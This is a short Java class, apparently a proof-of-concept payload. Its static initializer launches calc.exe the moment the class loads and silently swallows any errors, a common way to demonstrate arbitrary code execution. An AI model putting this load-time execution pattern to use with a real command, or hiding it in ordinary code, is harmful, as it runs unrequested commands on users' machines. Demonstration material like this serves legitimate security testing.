package com.example.Evil;

public class SimpleCalc {

    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {

        }
    }

}
